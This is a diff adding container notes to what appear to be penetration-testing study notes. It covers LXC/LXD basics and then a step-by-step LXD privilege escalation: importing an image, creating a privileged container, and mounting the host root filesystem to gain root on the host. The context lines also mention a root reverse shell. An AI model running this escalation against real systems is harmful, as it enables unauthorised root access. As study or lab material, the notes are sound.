@@ -1438,3 +1438,95 @@ ls -la /dmz-backups/
    * Within 3 minutes, a **root reverse shell** connects back.
 
 ---
+
+# Containers
+
+## Containers Overview
+- **Containers** operate at the **OS level**, while **VMs** operate at the **hardware level**.
+- Containers:
+  - Share the host OS.
+  - Isolate application processes.
+  - Lightweight compared to VMs.
+- Virtual Machines:
+  - Run multiple OSes simultaneously on a single host.
+- **Isolation & Virtualization Benefits**:
+  - Resource management.
+  - Improved security (process isolation).
+  - Monitoring to detect unrelated system errors.
+  - Restrict applications (e.g., web apps, APIs) from escalating privileges.
+
+## Linux Containers (LXC)
+- **LXC** = OS-level virtualization to run multiple isolated Linux systems on a single host.
+- Containers share the host kernel but have their own processes.
+- Advantages:
+  - Lightweight, resource-efficient compared to VMs.
+  - Standard interface for managing multiple containers.
+  - Portability across different clouds.
+  - Easy management (start/stop containers, change env variables).
+- Became widely popular due to **Docker** ecosystem.
+
+## Linux Daemon (LXD)
+- **LXD** = system container manager.
+- Runs full OS containers (not just application containers).
+- User must be in `lxd` group to use it:
+  ```bash
+  id
+  ```
+
+Example output:
+
+```
+uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
+```
+
+## Exploiting LXC/LXD
+
+* Attackers can exploit insecure templates or weak configurations.
+* Steps to exploit:
+
+### 1. Check for available container images
+
+```bash
+cd ContainerImages
+ls
+```
+
+Example:
+
+```
+ubuntu-template.tar.xz
+```
+
+### 2. Import the container image
+
+```bash
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image list
+```
+
+### 3. Initialize with privileged flag
+
+* Use `security.privileged=true` to disable isolation.
+* Mount host root into container:
+
+```bash
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+
+### 4. Start and access the container
+
+```bash
+lxc start privesc
+lxc exec privesc /bin/bash
+```
+
+### 5. Access host filesystem as root
+
+```bash
+ls -l /mnt/root
+```
+
+This exposes the host root filesystem, enabling **privilege escalation**.
+
+---
